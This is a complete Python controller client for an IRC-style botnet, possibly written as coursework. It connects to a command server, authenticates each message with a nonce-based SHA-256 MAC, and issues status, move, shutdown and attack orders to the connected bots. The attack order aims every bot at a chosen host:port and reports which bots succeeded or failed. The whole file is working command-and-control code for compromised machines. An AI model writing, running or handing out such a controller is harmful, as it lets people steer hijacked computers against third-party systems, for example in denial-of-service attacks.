#!/bin/env python3

import argparse
import random
import socket
import time
import hashlib
import select

SECRET = None
nonce = random.randint(0, 99)


def parse_args():
    '''
    parsing of inputs logic 
    needs the hostport and secret
    '''
    parser = argparse.ArgumentParser(
        prog='client',
        description='client connects to server')
    parser.add_argument("hostport", help="<hostname>:<port>")
    parser.add_argument("secret", help="Secret key for authentication")
    return parser.parse_args()



def status(sock):
    '''
    provides the status of bots
    '''
    nonce, mac = calculate_mac()
    sock.sendall(f"{nonce} {mac} status\n".encode())
    responses = wait_responses("status", sock)
    print(f"  Result: {len(responses)} bots replied.")
    formatted_responses = []
    for response in responses:
        parts = response.split()
        nick = parts[1]
        count = parts[2]
        formatted_responses.append(f"{nick} ({count})")
    formatted_responses = ", ".join(formatted_responses)
    if(len(responses) > 0): print(f"    {formatted_responses}")

def shutdown(sock):
    '''
    shutdown  bots
    '''
    nonce, mac = calculate_mac()
    sock.sendall(f"{nonce} {mac} shutdown\n".encode())
    responses = wait_responses("shutdown", sock)
    print(f"  Result: {len(responses)} bots shut down.")
    formatted_responses = []
    for response in responses:
        parts = response.split()
        nick = parts[1]
        formatted_responses.append(f"{nick}")
    formatted_responses = ", ".join(formatted_responses)
    if(len(responses) > 0): print(f"    {formatted_responses}")
    
def move(sock, cmd):
    '''
    move  bots to a new IRC server
    '''
    nonce, mac = calculate_mac()
    sock.sendall(f"{nonce} {mac} move  {cmd[1]}\n".encode())
    responses = wait_responses("move", sock)
    print(f"  Result: {len(responses)} bots moved.")
    formatted_responses = []
    for response in responses:
        parts = response.split()
        nick = parts[1]
        formatted_responses.append(f"{nick}")
    formatted_responses = ", ".join(formatted_responses)
    if(len(responses) > 0): print(f"    {formatted_responses}")
    
    
def attack(sock, cmd):
    '''
    triggers the attacking commnand on all bots 
    involves formatting of strings
    '''
    nonce, mac = calculate_mac()
    sock.sendall(f"{nonce} {mac} attack {cmd[1]}\n".encode())
    responses = wait_responses("attack", sock)
    successful_responses = []
    failed_responses = []
    # -attack bot-2 FAIL timeout
    for response in responses:
        response_arr = response.split()
        if response_arr[2] == "FAIL":
            failed_responses.append(f"    {response_arr[1]}: {' '.join(response_arr[3:])}")
        else:
            successful_responses.append(response_arr[1])
            
    print(f"  Result: {len(successful_responses)} bots attacked successfully:")
    formatted_responses = ", ".join(successful_responses)
    if(len(successful_responses) > 0): print(f"    {formatted_responses}")
    print(f"  Result: {len(failed_responses)} bots failed to attack:")
    if(len(failed_responses) > 0):
        for failed_response in failed_responses:
            print(failed_response)

def wait_responses(cmd, sock):
    '''waits for responses for 5 seconds and responses are formatted so that only
    the ones of cmd would be. [-status ..., -shutdown ...]
    if cmd is status, then responses would be  [-status ...]
    '''
    responses = ""
    print("  Waiting 5s to gather replies.")
    start_time = time.time()
    while time.time() - start_time < 5: # while it is not 5 second
        ready, _, _ = select.select([sock], [], [], 1)  # wait up to 1s
        if ready:
            response = sock.recv(4096).decode()
            responses += response
    # print(responses)
    responses = responses.split("\n")
    responses = [resp.strip() for resp in responses if resp.strip().startswith(f"-{cmd}")]
    # print(responses)
    return responses

def calculate_mac():
    #calculate the mac using the sha256 of nonce + secret
    global nonce, SECRET
    nonce += 1
    mac = hashlib.sha256((str(nonce) + SECRET).encode()).hexdigest()[:8]
    return nonce,mac

def handle_command(sock, cmd):
    '''this is where the commands are handle for status, attack, move and shutdown'''
    cmd = cmd.strip().split()
    
    if(cmd[0] == "status"):
        if(len(cmd) != 1): #handling of incorrect input
            print("  Invalid status usage, please use status only")
        status(sock)
        
    elif(cmd[0] == "attack"):
        if(len(cmd) != 2):
            print("  Invalid attack usage, please use 2 args")
            return
        if(":" not in cmd[1]):
            print("Did not provide correct hostport")
            return
        attack(sock, cmd)
        
    elif(cmd[0] == "move"):
        if(len(cmd) != 2):
            print("  Invalid move usage, please use 2 args")
            return
        if(":" not in cmd[1]):
            print("Did not provide correct hostport")
            return
        move(sock, cmd)
        
    elif(cmd[0] == "shutdown"):
        if(len(cmd) != 1):
            print("  Invalid shutdown usage, please use shutdown only")
        shutdown(sock)
        
    elif(cmd[0] == "quit"):
        if(len(cmd) != 1):
            print("  Invalid quit usage, please use quit only")
        print("Disconnected")
        exit(0)
        
    else:
        print("Wrong command input")

def main():
    '''
    parsing of args and assigning values to global vars 
    are done in this function
    Also there is the socket connection
    '''
    global SECRET
    args = parse_args()
    try:
        host, port = args.hostport.split(":")
        port = int(port)
    except ValueError:
        print("Error: Invalid <hostname>:<port> format. Expected 'hostname:port'.")
        exit(1)
    SECRET = args.secret
    
    #socket connection
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        print("Connected")
        while True:
            cmd = input("cmd> ").strip()
            handle_command(sock,cmd)
            
    #handling of errors
    except ConnectionRefusedError:
        sock.close()
        print("Failed to connect.")
        exit(1)
            
    except socket.gaierror as e:
        print(f"no such hostname")  
        exit(1) 
            
    except Exception as e:
        #print(e)
        sock.close()
        print("Disconnected")
        exit(1)
        
        

if __name__ == "__main__":
    main()
